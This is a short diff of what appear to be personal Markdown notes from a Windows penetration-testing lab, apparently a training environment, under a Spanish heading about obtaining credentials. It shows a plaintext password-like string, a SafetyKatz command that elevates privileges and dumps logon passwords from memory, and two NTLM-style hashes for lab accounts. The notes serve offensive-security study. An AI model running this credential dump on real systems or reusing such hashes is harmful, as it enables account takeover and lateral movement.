@@ -43,6 +43,7 @@ P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
 
 ### Obtener credenciales
 - [ ] `SafetyKatz.exe "privilege::debug" "token::elevate" "sekurlsa::evasive-logonPasswords" "exit"`
+![[Pasted image 20260727164436.png]]
 
 studvm$  -> 95dad9bc92763efe74968c2fcccc3b61 
 studentuser -> 686079be7b2a8fae60d502ddc416b2e0 
